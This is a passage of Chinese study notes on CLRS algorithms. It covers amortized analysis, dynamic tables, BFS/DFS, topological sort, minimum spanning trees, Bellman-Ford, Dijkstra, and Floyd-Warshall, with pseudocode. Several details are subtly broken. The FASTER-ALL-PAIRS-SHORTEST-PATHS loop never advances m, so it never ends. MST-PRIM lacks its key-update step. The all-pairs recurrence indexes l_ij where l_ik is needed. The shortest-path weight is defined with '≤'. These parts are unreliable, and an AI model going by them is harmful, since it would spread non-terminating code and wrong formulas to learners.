\\hat{c_i}$给出了总实际代价$\\sum^n_{i=1}{c_i}$的一个上界\n\n我们通常将$\\Phi(D_0)$简单定义为0，然后说明对所有$i$，有$\\Phi(D_i) \\geq 0$\n##### 栈操作\n对于初始的空栈$D_0$，有$\\Phi(D_0)=0$。由于栈中对象数目永远不可能为负，所以第$i$步操作得到的栈$D_i$具有非负的势，即：\n$$\\Phi(D_i) \\geq 0 = \\Phi(D_0)$$\n\n如果第$i$个操作是 `PUSH` 操作，此时栈中包含$s$个对象，则势差为：\n$$\\Phi(D_i)-\\Phi(D_{i-1}) = (s+1)-s = 1$$\n\n`PUSH` 摊还代价为：\n$$\\hat{c_i} = c_i+\\Phi(D_i)-\\Phi(D_{i-1}) = 1+1=2$$\n\n如果第$i$个操作是 `MULTIPOP` 操作，将$k'=min(k,s)$个对象弹出栈，则势差为：\n$$\\Phi(D_i)-\\Phi(D_{i-1}) =-k'$$\n\n`MULTIPOP` 摊还代价为：\n$$\\hat{c_i} = c_i+\\Phi(D_i)-\\Phi(D_{i-1}) = k'-k'=0$$\n\n如果第$i$个操作是 `POP` 操作，此时栈中包含$s$个对象，则势差为：\n$$\\Phi(D_i)-\\Phi(D_{i-1}) = (s-1)-s = -1$$\n\n`POP` 摊还代价为：\n$$\\hat{c_i} = c_i+\\Phi(D_i)-\\Phi(D_{i-1}) = 1-1=0$$\n\n每个操作的摊还代价都是$O(1)$，因此，$n$个操作的总摊还代价为$O(n)$，为总实际代价的上界，所以$n$个操作的最坏情况时间为$O(n)$\n##### 二进制计数器递增\n将计数器执行$i$次 `INCREMENT` 操作后的势定义为$b_i$：$i$次操作后计数器中1的个数\n假设第$i$个 `INCREMENT` 操作将$t_i$个位复位，则其实际代价至多为$t_i+1$。势差为：\n$$\\Phi(D_i)-\\Phi(D_{i-1}) \\leq (b_{i-1}-t_i+1)-b_{i-1}=1-t_i$$\n摊还代价为：\n$$\\hat{c_i} = c_i+\\Phi(D_i)-\\Phi(D_{i-1}) \\leq (t_i+1)+(1-t_i)=2$$\n如果计数器从0开始，则$\\Phi(D_0)=0$。由于对所有$i$均有$\\Phi(D_i)\\geq 0$，因此，一个$n$个 `INCREMENT` 操作的序列的总摊还代价是总实际代价的上界，最坏情况时间为$O(n)$\n#### 动态表\n##### 表扩张\n```text\nTABLE-INSERT(T, x)\nif T.size == 0\n    allocate T.table with 1 slot\n    T.size = 1\nif T.num == T.size\n    allocate newtable with 2*T.size slots\n    insert all items in T.table into newtable\n    free T.table\n    T.table = newtable\n    T.size = 2 * T.size\ninsert x into T.table\nT.num = T.num + 1\n```\n第$i$个操作的代价为：\n$$\nc_i =\n\\begin{cases}\ni \\qquad & i-1 = 2^k \\\\\n1 \\qquad  & other\n\\end{cases} \n$$\n\n$n$个 `TABLE-INSERT` 操作的总代价为：\n$$\\sum^n_{i=1}c_i \\leq n+\\sum^{\\lfloor lgn \\rfloor}_{j=0}2^j<n+2n=3n $$\n## 图算法\n### 基本的图算法\n#### 图的表示\n##### 邻接链表\n对于图$G=(V,E)$来说，其邻接链表表示由一个包含$|V|$条链表的数组$Adj$所构成，每个结点有一条链表\n对于每个结点$u \\in V$，邻接链表$Adj[u]$包含所有与结点$u$之间有边相连的结点$v$\n- 如果$G$是一个有向图，则对于边$(u,v)$来说，结点$v$将出现在链表$Adj[u]$里，因此，所有邻接链表的长度之和等于$|E|$\n- 如果$G$是一个无向图，则对于边$(u,v)$来说，结点$v$将出现在链表$Adj[u]$里，结点$u$将出现在链表$Adj[v]$里，因此，所有邻接链表的长度之和等于$2|E|$\n- 不论是有向图还是无向图，邻接链表存储空间需求均为$\\Theta(V+E)$\n\n对邻接链表稍加修改，就可以用来表示**权重图**：只需要将边$(u,v)$的权重值$w(u,v)$存放放在结点$u$的邻接链表里\n邻接链表的一个潜在缺陷是无法快速判断一条边$(u,v)$是否是图中的一条边\n\n![linkedlistgraph](https://d-sketon.top/img/clrs-book/10.png)\n\n##### 邻接矩阵\n图$G$的邻接矩阵表示由一个$|V| \\times |V|$的矩阵$A=(a_{ij})$予以表示，该矩阵满足下述条件：\n$$\na_{ij} =\n\\begin{cases}\n1 \\qquad & (i,j) \\in E \\\\\n0 \\qquad  & other\n\\end{cases} \n$$\n\n不管一个图有多少条边，邻接矩阵的空间需求均为$\\Theta(V^2)$\n邻接矩阵也可以用来表示**权重图**：直接将边$(u,v) \\in E$的权重$w(u,v)$存放在邻接矩阵中的第$u$行第$v$列记录上\n\n![matrixgraph](https://d-sketon.top/img/clrs-book/11.png)\n\n#### 广度优先搜索（BFS）\n为了跟踪算法的进展，广度优先搜索在概念上将每个结点涂上白色、灰色或黑色。所有结点在一开始的时候均涂上白色。在算法的推进过程中，这些结点可能会变成灰色或黑色\n如果边$(u,v) \\in E$且结点$u$是黑色，则结点$v$既可能是灰色也可能是黑色。也就是说，所有与黑色结点邻接的结点都以被发现。对于灰色结点来说，其邻接结点中可能存在未被发现的白色结点\n在执行广度优先搜索的过程中将构造出一棵广度优先树\n\n假定输入图$G=(V,E)$是以邻接链表所表示的：\n```text\nBFS(G, s)\nfor each vertex u in G.V - {s}\n    u.color = WHITE\n    u.d = ∞\n    u.π = NIL\ns.color = GRAY\ns.d = 0\ns.π = NIL\nQ = ∅\nENQUEUE(Q, s)\nwhile Q != ∅\n    u = DEQUEUE(Q)\n    for each v in G.Adj[u]\n        if v.color == WHITE\n            v.color = GRAY\n            v.d = u.d + 1\n            v.π = u\n            ENQUEUE(Q, v)\n    u.color = BLACK\n```\n\n![bfs](https://d-sketon.top/img/clrs-book/12.png)\n\n##### 分析\n广度优先搜索的总运行时间为$O(V+E)$\n##### 最短路径\n我们定义从源结点$s$到结点$v$的**最短路径距离**$\\delta(s,v)$为从结点$s$到结点$v$之间所有路径里面最少的边数\n如果从结点$s$到结点$v$之间没有路径，则$\\delta(s,v) = \\infty$\n我们称从结点$s$到结点$v$的长度为$\\delta(s,v)$的路径为$s$到$v$的**最短路径**\n\n设$G=(V,E)$为一个有向图或无向图，又假设 `BFS` 以$s$为源结点在图$G$上运行。那么在算法执行过程中，`BFS` 将发现从源结点$s$可以到达的所有结点$v \\in V$，并在算法终止时，对于所有的$v \\in V,v.d = \\delta(s,v)$。而且，对于任意可以从$s$到达的结点$v \\neq s$，从源结点$s$到结点$v$的其中一条最短路径为从结点$s$到结点$v.\\pi$的最短路径再加上边$(v.\\pi,v)$\n\n##### 广度优先树\n我们定义图$G$的**前驱子图**为$G_\\pi =(V_\\pi,E_\\pi)$，其中$V_\\pi = \\{v\\in V:v.\\pi \\neq NIL\\} \\cup \\{s\\}$，$E_\\pi = \\{(v.\\pi,v):v \\in V_\\pi - \\{s\\}\\}$\n当运行在一个有向或无向图$G=(V,E)$上时，`BFS` 过程所建造出来的$\\pi$属性使得前驱子图$G_\\pi=(V_\\pi,E_\\pi)$成为一棵广度优先树\n\n`PRINT-PATH` 可打印出从源结点$s$到结点$v$的一条最短路径上的所有结点，这里假定 `BFS` 已经计算出一棵广度优先树：\n```text\nPRINT-PATH(G, s, v)\nif v == s\n    print s\nelseif v.π == NIL\n    print \"no path from\" s \"to\" v \"exists\"\nelse\n    PRINT-PATH(G, s, v.π)\n    print v\n```\n#### 深度优先搜索（DFS）\n我们定义图$G$的**前驱子图**为$G_\\pi =(V,E_\\pi)$，其中$E_\\pi = \\{(v.\\pi,v):v \\in V \\land v.\\pi \\neq NIL\\}$\n与广度优先搜索不同，深度优先搜索的前驱子图可能由**多颗树**组成，因为搜索可能从多个源结点重复进行\n深度优先搜索的前驱子图形成一个由多颗**深度优先树**构成的**深度优先森林**，森林$E_\\pi$中的边仍然称为**树边**\n\n像广度优先搜索一样，深度优先搜索算法在搜索过程中也是对结点进行涂色来指明结点的状态。每个结点的初始颜色都是白色，在结点被**发现**后变为灰色，在其邻接链表被扫描**完成**后变为黑色。该方法可以保证每个结点仅在一棵深度优先树中出现，因此，所有的深度优先树是不相交的\n\n深度优先算法在每个结点盖上一个**时间戳**。每个结点$v$有两个时间戳：第一个时间戳$v.d$记录结点$v$第一次被发现的时间（涂上灰色的时候），第二个时间戳$v.f$记录的是搜索完成对$v$的邻接链表扫描的时间（涂上黑色的时候）\n\n输入图$G$既可以是无向图，可以是有向图。变量$time$是一个全局变量，用来计算时间戳：\n```text\nDFS(G)\nfor each vertex u in G.V\n    u.color = WHITE\n    u.π = NIL\ntime = 0\nfor each vertex u in G.V\n    if u.color == WHITE\n        DFS-VISIT(G, u)\n\nDFS-VISIT(G, u)\ntime = time + 1\nu.d = time\nu.color = GRAY\nfor each v in G.Adj[u]\n    if v.color == WHITE\n        v.π = u\n        DFS-VISIT(G, v)\nu.color = BLACK\ntime = time + 1\nu.f = time\n```\n\n![dfs](https://d-sketon.top/img/clrs-book/13.png)\n\n##### 分析\n深度优先搜索的总运行时间为$O(V+E)$\n##### 深度优先搜索的性质\n**括号化定理**：在对有向或无向图$G=(V,E)$进行的任意深度优先搜索中，对于任意两个结点$u$和$v$来说，下面三种情况只有一成立：\n- 区间$[u.d,u.f]$和区间$[v.d,v.f]$完全分离，在深度优先森林中，结点$u$不是结点$v$的后代，结点$v$也不是结点$u$的后代\n- 区间$[u.d,u.f]$完全包含在区间$[v.d,v.f]$内，在深度优先树中，结点$u$是结点$v$的后代\n- 区间$[v.d,v.f]$完全包含在区间$[u.d,u.f]$内，在深度优先树中，结点$v$是结点$u$的后代\n\n**后代区间的嵌套**：在有向或无向图$G$的深度优先森林中，结点$v$是结点$u$的真后代当且仅当$u.d<v.d<v.f<u.f$成立\n**白色路径定理**：在有向或无向图$G=(V,E)$的深度优先森林中，结点$v$是结点$u$的后代当且仅当在发现结点$u$的时间$u.d$，存在一条从结点$u$到结点$v$的全部由白色结点所构成的路径\n##### 边的分类 \n- **树边**：为深度优先森林$G_\\pi$中的边，如果结点$v$是因算法对边$(u,v)$的探索而首先被发现，则$(u,v)$是一条树边\n- **后向边**：后向边$(u,v)$是将结点$u$连接到其在深度优先树中（一个）祖先结点$v$的边。由于有向图中可以有自循环，自循环也被认为是后向边\n- **前向边**：是将结点$u$连接到其在深度优先树中一个后代结点$v$的边$(u,v)$\n- **横向边**：指其他所有的边。这些边可以连接同一棵深度优先树中的结点，只要其中一个结点不是另外一个结点的祖先，也可以连接不同深度优先树中的两个结点\n\n结点$v$的颜色能够告诉我们关于该条边的一些信息：\n- 结点$v$为**白色**表明该条边$(u,v)$是一条树边\n- 结点$v$为**灰色**表明该条边$(u,v)$是一条后向边\n- 结点$v$为**黑色**表明该条边$(u,v)$是一条前向边或横向边\n  \n在对无向图$G$进行深度优先搜索时，每条边要么是**树边**，要么是**后向边**\n#### 拓扑排序\n对于一个有向无环图$G=(V,E)$来说，其拓扑排序是$G$中所有结点的一种线性次序，该次序满足如下条件：\n如果图$G$包含边$(u,v)$，则结点$u$在拓扑排序中处于结点$v$的前面（如果图$G$包含环路，则不可能排出一个线性次序）\n\n下面的简单算法可以对一个有向无环图进行拓扑排序，完成时间$\\Theta(V+E)$：\n```text\nTOPOLOGICAL-SORT(G)\ncall DFS(G) to compute finishing times v.f for each vertex v\nas each vertex is finished, insert it onto the front of a linked list\nreturn the linked list of vertices\n```\n#### 强连通分量\n有向图$G=(V,E)$的强连通分量是一个最大结点集合$C \\subseteq V$，对于该集合中的任意一对结点$u$和$v$来说，路径$u \\leadsto v$和路径$v \\leadsto u$同时存在\n\n下面的 `Kosaraju` 算法使用两次深度优先搜索来计算有向图$G-=(V,E)$的强连通分量，时间复杂度$\\Theta(V+E)$：\n```text\nSTRONGLY-CONNECTED-COMPONENTS(G)\ncall DFS(G) to compute finishing times u.f for each vertex u\ncompute G^T\ncall DFS(G^T), but in the main loop of DFS, consider the vertices\n    in order of decreasing u.f (as computed in line 1)\noutput the vertices of each tree in the depth-first forest formed in line 3 as a \n    separate strongly connected component\n```\n### 最小生成树\n#### 最小生成树的形成\n假定有一个连通无向图$G=(V,E)$和权重函数$w:E\\rightarrow \\Reals$。我们希望找出图$G$的一棵最小生成树\n\n使用贪心策略来生成最小生成树：\n```text\nGENERIC-MST(G, w)\nA = ∅\nwhile A does not form a spanning tree\n    find an edge(u,v) that is safe for A\n    A = A ∪ {(u,v)}\nreturn A\n```\n#### Kruskal算法\n`Kruskal` 算法使用一个不相交集合数据结构来维护几个互不相交的元素集合。每个集合代表当前森林中的一棵树。通过测试 `FIND-SET(u)` 是否等于 `FIND-SET(v)` 来判断结点$u$和结点$v$是否属于同一棵树，使用 `UNION` 过程来对两棵树进行合并\n时间复杂度$O(ElgV)$：\n```text\nMST-KRUSKAL(G, w)\nA = ∅\nfor each vertex v in G.V\n    MAKE-SET(v)\nsort the edges of G.E into nondecreasing order by weight w\nfor each edge(u,v) in G.E, taken in nondecreasing order by weight\n    if FIND-SET(u) != FIND-SET(v)\n        A = A ∪ {(u,v)}\n        UNION(u,v)\nreturn A\n```\n#### Prim算法\n`Prim` 算法每一步在连接集合$A$和$A$之外的结点的所有边中，选择一条轻量级边加入到$A$中\n\n连通图$G$和最小生成树的根结点$r$将作为算法的输入。在算法的执行过程中，所有**不在**树$A$中的结点都存放在一个基于$key$属性的最小优先队列$Q$中。对每个结点$v$，属性$v.key$保存的是连接$v$和树中结点的所有边中最小边的权重。属性$v.\\pi$给出的是结点$v$在树中的父结点\n\n若使用二叉最小优先队列，时间复杂度$O(VlgV+ElgV)=O(ElgV)$；若使用斐波那契堆来实现最小优先队列，时间复杂度$O(E+VlgV)$：\n```text\nMST-PRIM(G, w, r)\nfor each u in G.V\n    u.key = ∞\n    u.π = NIL\nr.key = 0\nQ = G.V\nwhile Q != ∅\n    u = EXTRACT-MIN(Q)\n    for each v in G.Adj[u]\n    if v in Q and w(u,v)  < v.key\n        v.π = u\n        v.key = w(u,v)\n```\n### 单源最短路径\n在**最短路径问题**中，我们给定一个带权重的有向图$G=(V,E)$和权重函数$w: E\\rightarrow \\Reals$，该权重函数将每条边映射到实数值的权重上\n图中一条路径$p=\\langle v_0,v_1,...,b_k \\rangle$的权重$w(p)$是构成该路径的所有边的权重之和：\n$$\nw(p)=\\sum^k_{i=1}w(v_{i-1},v_i)\n$$\n\n定义从结点a$u$到结点$v$的**最短路径权重**$\\delta(u,v)$如下：\n$$\n\\delta(u,v)\\leq\n\\begin{cases}\nmin\\{w(p):u \\leadsto^p v \\} \\qquad & if \\ exists \\ a\\ path\\ from\\ u \\ to \\ v \\\\\n\\infty \\qquad  & other\n\\end{cases} \n$$\n从结点$u$到结点$v$的**最短路径**定义为任何一条权重为$w(p)=\\delta(w,v)$的从$u$到$v$的路径$p$\n#### 常规概念\n##### 负权重的边\n如果图$G=(V,E)$不包含从源结点$s$可以到达的权重为负值的环路，则对于所有的结点$v \\in V$，最短路径权重$\\delta(s,v)$都有精确定义，即使其取值为负数\n如果图$G$包含从$s$可以达到的权重为负值的环路，则最短路径权重无定义\n##### 环路\n最短路径不能包含权重为负值的环路\n最短路径不能包含权重为正值的环路\n##### 最短路径的表示\n$\\pi$值所诱导的**前驱子图**$G_\\pi=(V_\\pi,E_\\pi)$定义如下：\n$$V_\\pi = \\{v\\in V:v.\\pi \\neq NIL\\} \\cup \\{s\\}$$\n\n$$E_\\pi = \\{(v.\\pi,v) \\in E:v \\in V_\\pi - \\{s\\}\\}$$\n\n在算法终止时，$G_\\pi$是一棵**最短路径树**\n最短路径不一定是唯一的，最短路径树也不一定是唯一的\n##### 松弛操作\n对于每个结点$v$，我们维持一个属性$v.d$来记录从原结点$s$到结点$v$的最短路径权重的上界。我们称$v.d$为$s$到$v$的**最短路径估计**。我们使用下面运行时间为$\\Theta(V)$的算法来对最短路径估计和前驱结点进行初始化：\n```text\nINITIALIZE-SINGLE-SOURCE(G, s)\nfor each vertex v in G.V\n    v.d = ∞\n    v.π = NIL\ns.d = 0\n```\n`RELAX` 过程对边$(u,v)$在$O(1)$时间内进行松弛操作：\n```text\nRELAX(u, v, w)\nif v.d > u.d + w(u,v)\n    v.d = u.d + w(u,v)\n    v.π = u\n```\n##### 最短路径和松弛操作的性质\n**三角不等式性质**：对于任何边$(u,v) \\in E$，有$\\delta(s,v) \\leq \\delta(s,u)+w(u,v)$\n**上界性质**：对于所有的结点$v \\in V$，有$v.d \\geq \\delta(s,v)$。一旦$v.d$的取值达到$\\delta(s,v)$，其值将不再发生变化\n**非路径性质**：如果从结点$s$到结点$v$之间不存在路径，则有$v.d=\\delta(s,v)=\\infty$\n**收敛性质**：对于某些结点$u,v \\in V$，如果$s \\leadsto u \\rightarrow v$是图$G$中的一条最短路径，并且在对边$(u,v)$进行松弛前的任意时间有$u.d=\\delta(s,u)$，则在之后的所有时间有$v.d=\\delta(s,v)$\n**路径松弛性质**：如果$p=\\langle v_0,v_1,...,v_k \\rangle$是从源结点$s=v_0$到结点$v_k$的一条最短路径，且对$p$中的边所进行的松弛的次序为$(v_0,v_1)$，$(v_1,v_2)$，...，$(v_{k-1},v_k)$，则$v_k.d=\\delta(s,v_k)$，该性质的成立与任何其他的松弛操作无关，即使这些松弛操作是与对$p$上的边所进行的松弛操作是穿插进行的\n#### Bellman-Ford算法\n`Bellman-Ford` 算法解决一般情况下的单元最短路径问题，边的权重可以为负值\n`Bellman-Ford` 算法返回 `TRUE` 值当且仅当输入图不包含可以从源结点到达的权重为负值的环路：\n```text\nBELLMAN-FORD(G, w, s)\nINITIALIZE-SINGLE-SOURCE(G, s)\nfor i = 1 to |G.V| - 1\n    for each edge(u,v) in G.E\n        RELAX(u, v, w)\nfor each edge(u,v) in G.E\n    if v.d > u.d + w(u,v)\n        return FALSE\nreturn TRUE\n```\n`Bellman-Ford` 算法总运行时间$O(VE)$\n#### 有向无环图中的单源最短路径问题\n根据结点的拓扑排序次序来对带权重的有向无环图$G=(V,E)$进行边的松弛操作，我们便可以在$O(V,E)$时间内计算出从单个源结点到所有结点之间的最短路径：\n```text\nDAG-SHORTEST-PATHS(G, w, s)\ntopologically sort the vertices of G\nINITIALIZE-SINGLE-SOURCE(G, s)\nfor each vertex u, taken in topologically sorted order\n    for each vertex v in G.Adj[u]\n    RELAX(u, v, w)\n```\n#### Dijkstra算法\n`Dijkstra` 算法要求所有边的权重都为非负值：\n```text\nDIJKSTRA(G, w, s)\nINITIALIZE-SINGLE-SOURCE(G, s)\nS = ∅\nQ = G.V\nwhile Q != ∅\n    u = EXTRACT-MIN(Q)\n    S = S ∪ {u}\n    for each vertex v in G.Adj[u]\n        RELAX(u, v, w)\n```\n`Dijkstra` 算法总运行时间依赖于最小优先队列的实现：\n- 通过利用结点的编号为$1 - |V|$来维持最小优先队列。在这种情况下，每次 `INSERT` 和 `DECREASE-KEY` 操作的执行时间为$O(1)$，每次 `EXTRACT-MIN` 的操作时间为$O(V)$，算法总运行时间为$O(V^2+E)=O(V^2)$\n- 若图为稀疏图，特别地，如果$E=o(V^2/lgV)$，则可以通过二叉堆来实现最小优先队列，每次 `EXTRACT-MIN` 的操作时间为$O(lgV)$，每次 `DECREASE-KEY` 的操作时间为$O(lgV)$，构建最小二叉堆的成本为$O(V)$，算法总运行时间为$O((V+E)lgV)$。若所有结点都可以从源结点到达，则该时间为$O(ElgV)$\n- 若使用斐波那契堆来时间最小优先队列，每次 `EXTRACT-MIN` 的操作时间为$O(lgV)$，每次 `DECREASE-KEY` 的操作时间为$O(1)$，算法总运行时间为$O(VlgV+E)$\n#### 差分约束和最短路径\n##### 差分约束系统\n设向量$x=(x_1,x_2,...,x_n)$为差分约束系统$Ax \\leq b$的一个解，设$d$为任意常数，则$x+d=(x_1+d,x_2+d,...,x_n+d)$也是该差分约束系统的一个解\n##### 约束图\n给定差分约束系统$Ax \\leq b$，其对应的**约束图**是一个带权重的有向图$G=(V,E)$，这里：\n$$V=\\{v_0,v_1,...,v_n\\}$$\n\n$$E=\\{(v_i,v_j):v_j-v_i \\leq b_k\\text{是一个约束条件}\\} \\cup \\{(v_0,v_1),(v_0,v_2),...(v_0,v_n)\\}$$\n\n- 约束图包含一个额外的结点$v_0$，用来保证图中至少存在一个结点，从其出发可以到达所以其他的结点\n- 如果$x_j-x_i \\leq b_k$是一个差分约束条件，则边$(v_i,v_j)$的权重为$w(v_i,v_j)=b_k$\n- 所有从结点$v_0$发出的边的权重为0\n\n给定差分约束系统$Ax \\leq b$，设$G=(V,E)$是该差分约束系统所对应的约束图。如果图$G$不包含权重为负值的环路，则：\n$$x=(\\delta(v_0,v_1),\\delta(v_0,v_2),...,\\delta(v_0,v_n))$$\n\n是该系统的一个可行解。如果图$G$包含权重为负值的环路，则该系统没有可行解\n##### 求解差分约束系统\n一个有$n$个未知变量和$m$个约束条件的差分约束系统所生成的约束图有$n+1$个结点和$m+n$条边。使用 `Bellman-Ford` 算法可以在$O((n+1)(m+n)) = O(n^2+mn)$时间内求解该系统\n\n### 所有结点对的最短路径\n假定结点的编号为$1,2,...,|V|$，因此，算法的输入将是一个$n \\times n$的矩阵$W$，该矩阵代表的是一个有$n$个结点的有向图$G=(V,E)$的边的权重，即$W=(w_{ij})$，其中：\n$$\nw_{ij} =\n\\begin{cases}\n0 \\qquad & i=j \\\\\nw_{ij} \\qquad & i \\neq j \\land (i,j) \\in E \\\\\n\\infty \\qquad & i \\neq j \\land (i,j) \\notin E\n\\end{cases} \n$$\n\n我们允许存在负权重的边，但假定图中不包括权重为负值的环路\n\n所有结点对最短路径算法的表格输出也是一个$n \\times n$的矩阵$D=(d_{ij})$，其中$d_{ij}$代表的是从结点$i$到结点$j$的一条最短路径的权重\n前驱结点矩阵$\\Pi =(\\pi_{ij})$，其中$\\pi_{ij}$在$i=j$或从$i$到$j$不存在路径时为$NIL$，在其他情况下给出的是从结点$i$到结点$j$的某条最短路径上结点$j$的前驱结点。由矩阵$\\Pi$的第$i$行所诱导的子图一个是一棵根结点为$i$的最短路径树。对于每个结点$i \\in V$，定义图$G$对于结点$i$的前驱子图为$G_{\\pi,i}=(V_{\\pi,i},E_{\\pi,i})$，其中：\n$$V_{\\pi,i}=\\{j\\in V:\\pi_{ij} \\neq NIL\\} \\cup \\{i\\} \\qquad E_{\\pi,i}=\\{(\\pi_{ij},j):j\\in V_{\\pi,i}-\\{i\\}\\}$$\n\n如果$G_{\\pi,i}$是一棵最短路径树，则下面的过程将打印出从结点$i$到结点$j$的一条最短路径：\n```text\nPRINT-ALL-PAIRS-SHORTEST-PATH(Π, i, j)\nif i == j\n    print i\nelseif π_{ij} == NIL\n    print \"no path from\" i \"to\" j \"exists\"\nelse\n    PRINT-ALL-PAIRS-SHORTEST-PATH(Π, i, π_{ij})\n    print j\n```\n#### 最短路径和矩阵乘法\n##### 最短路径的结构\n考虑从结点$i$到结点$j$的一条最短路径$p$，假定$p$至多包含$m$条边，还假定没有权重为负值的环路，且$m$为有限值。如果$i=j$，则$p$的权重为0且不包含任何边。如果结点$i$和结点$j$不同，则将路径分解为$i \\leadsto^{p'}k \\rightarrow j$，其中路径$p'$至多包含$m-1$条边，则有：\n$$\\delta(i,j)=\\delta(i,k)+w_{kj}$$\n##### 所有结点对最短路径问题的递归解\n设$l^{(m)}_{ij}$为从结点$i$到结点$j$的至多包含$m$条边的任意路径中的最小权重。当$m=0$时，从结点$i$到结点$j$之间存在一条没有边的最短路径当且仅当$i=j$，因此有：\n$$\nl^{(m)}_{ij} =\n\\begin{cases}\n0 \\qquad & i=j \\\\\n\\infty \\qquad & i \\neq j \n\\end{cases} \n$$\n\n递归定义：\n$$\nl^{(m)}_{ij} = min\\{l^{(m-1)}_{ij},min_{1 \\leq k \\leq n}\\{l^{(m-1)}_{ij} +w_{kj}\\}\\} = min_{1 \\leq k \\leq n}\\{l^{(m-1)}_{ij} + w_{kj}\\}\n$$\n\n最短路径权重可以由下面的公式给出：\n$$\n\\delta(i,j)=l^{(n-1)}_{ij}=l^{(n)}_{ij}=l^{(n+1)}_{ij} = ...\n$$\n##### 自底向上计算最短路径权重\n`EXTEND-SHORTEST-PATHS` 过程可以在给定$w$和$L^{(m-1)}$的情况下，计算出$L^{(m)}$，算法运行时间$\\Theta(n^3)$：\n```text\nEXTEND-SHORTEST-PATHS(L, W)\nn = L.rows\nlet L' = (l'_{ij}) be a new n * n matrix\nfor i = 1 to n\n    for j = 1 to n\n        l'_{ij} = ∞\n        for k = 1 to n\n            l'_{ij} = min(l'_{ij}, l_{ik} + w_{kj})\nreturn L'\n```\n设$A \\cdot B$表示由算法 `EXTEND-SHORTEST-PATHS(A, B)` 所返回的矩阵“乘积”，我们可以计算出下面由$n-1$个矩阵所构成的矩阵序列：\n$L^{(1)} = L^{(0)} \\cdot W = W$\n$L^{(2)} = L^{(1)} \\cdot W = W^2$\n$L^{(3)} = L^{(2)} \\cdot W = W^3$\n...\n$L^{(n-1)} = L^{(n-2)} \\cdot W = W^{n-1}$\n\n`SLOW-ALL-PAIRS-SHORTEST-PATHS` 过程可以在$\\Theta(n^4)$的时间内计算出矩阵$L^{(n-1)} = W^{n-1}$：\n```text\nSLOW-ALL-PAIRS-SHORTEST-PATHS(W)\nn = W.rows\nL(1) = W\nfor m = 2 to n-1\n    let L(m) be a new n * n matrix\n    L(m) = EXTEND-SHORTEST-PATHS(L(m-1), W)\nreturn L(n-1)\n```\n可以仅用$\\lceil lg(n-1) \\rceil$个矩阵乘积来计算矩阵$L^{(n-1)}$：\n$L^{(1)} = W$\n$L^{(2)} = W^2 = W \\cdot W$\n$L^{(4)} = W^4 = W^2 \\cdot W^2$\n$L^{(8)} = W^8 = W^4 \\cdot W^4$\n...\n$L^{(2^{\\lceil lg(n-1) \\rceil})} = W^{2^{\\lceil lg(n-1) \\rceil}} = W^{2^{\\lceil lg(n-1) \\rceil-1}} \\cdot W^{2^{\\lceil lg(n-1) \\rceil-1}}$\n由于$2^{\\lceil lg(n-1) \\rceil}\\geq n-1$，最后有$L^{(2^{\\lceil lg(n-1) \\rceil})}=L^{(n-1)}$\n`FASTER-ALL-PAIRS-SHORTEST-PATHS` 过程使用重复平方技术来计算上述矩阵序列，运行时间为$\\Theta(n^3lgn)$：\n```text\nFASTER-ALL-PAIRS-SHORTEST-PATHS(W)\nn = W.rows\nL(1) = W\nm = 1\nwhile m < n-1\n    let L(2m) be a new n * n matrix\n    L(2m) = EXTEND-SHORTEST-PATHS(L(m), L(m))\nreturn L(m)\n```\n#### Floyd-Warshall算法\n##### 所有结点对最短路径问题的一个递归解\n设$d^{(k)}_{ij}$为从结点$i$到结点$j$的所有中间结点全部取自集合$\\{1,2,...,k\\}$的一条最短路径的权重。递归定义$d^{(k)}_{ij}$如下：\n$$\nd^{(k)}_{ij} =\n\\begin{cases}\nw_{ij} \\qquad & k=0 \\\\\nmin(d^{(k-1)}_{ij},d^{(k-1)}_{ik}+d^{(k-1)}_{kj}) \\qquad & k \\geq 1\n\\end{cases} \n$$\n\n矩阵$D^{(n)} = (d^{(n)}_{ij})$给出的就是最后的答案：对于所有的$i,j \\in V$，$d^{(n)}_{ij}=\\delta(i,j)$\n##### 自底向上计算最短路径权重\n`FLOYD-WARSHALL` 算法的输入为一个$n \\times n$的矩阵$W$，返回最短路径权重矩阵$D^{(n)}$，运行时间为$\\Theta(V^3)$：\n```text\nFLOYD-WARSHALL(W)\nn = W.rows\nD(0) = W\nfor k = 1 to n\n    let D(k) = (d(k)_{ij}) be a new n * n matrix\n    for i = 1 to n\n        for j = 1 to n\n            d(k)_{ij} = min(d(k-1)_{ij},d(k-1)_{ik}+d(k-1)_{kj})\nreturn D(n)\n```\n##### 构建一条最短路径\n在 `Floyd-Warshall` 算法中，有多种不同的方法来构建最短路径\n- 先计算最短路径权重矩阵$D$，然后从$D$矩阵来构造前驱矩阵$\\Pi$\n- 可以在计算矩阵$D^{(k)}$的同时计算前驱矩阵$\\Pi$。即计算一个矩阵序列$\\Pi^{(0)}$，$\\Pi^{(1)}$，...，$\\Pi^{(n)}$。定义$\\pi^{(k)}_{ij}$为从结点$i$到结点$j$的一条所有中间结点都取自集合$\\{1,2,...,k\\}$的最短路径上$j$的前驱结点\n\n当$k=0$时，从$i$到$j$的一条最短路径没有中间结点，因此：\n$$\n\\pi^{(0)}_{ij} =\n\\begin{cases}\nNIL \\qquad & i=j \\lor w_{ij} = \\infty \\\\\ni \\qquad & i \\neq j \\land w_{ij} < \\infty\n\\end{cases} \n$$\n\n对于$k \\geq 1$，如果考虑路径$i \\leadsto k \\leadsto j,k \\neq j$，则所选择的结点$j$的前驱与我们选择的从结点$k$到结点$j$的一条中间结点全部取自集合$\\{1,2,...,k-1\\}$的最短路径上的前驱是一样的。否则，所选择的结点$j$的前驱与选择的从结点$i$到结点$j$的一条中间结点全部取自集合$\\{1,2,...,k-1\\}$的最短路径上的前驱是一样的。也就是说，对于$k \\geq 1$，有：\n$$\n\\pi^{(k)}_{ij} =\n\\begin{cases}\n\\pi^{(k-1)}_{ij} \\qquad & d^{(k-1)}_{ij} \\leq d^{(k-1)}_{ik}+d^{(k-1)}_{kj} \\\\\n\\pi^{(k-1)}_{kj} \\qquad & d^{(k-1)}_{ij}  >   d^{(k-1)}_{ik}+d^{(k-1)}_{kj}\n\\end{cases} \n$$\n##### 有向图的传递闭包\n定义图$G$的**传递闭包**为图$G^*=(V,E^*)$，其中$E^*=\\{(i,j):如果图G中包含一条从结点i到结点j的路径\\}$\n\n一种时间复杂度为$\\Theta(n^3)$的计算图$G$的传递闭包的办法是给$E$的每条边赋予权重1，然后运行 `Floyd-Warshall` 算法。如果存在一条从结点$i$到结点$j$的路径，则有$d_{ij}<n$；否则$d_{ij}=\\infty$\n\n另一种类似办法是：以逻辑或操作（$\\lor$）和逻辑与操作（$\\land$）来替换 `Floyd-Warshall` 算法中的算术操作 `min` 和 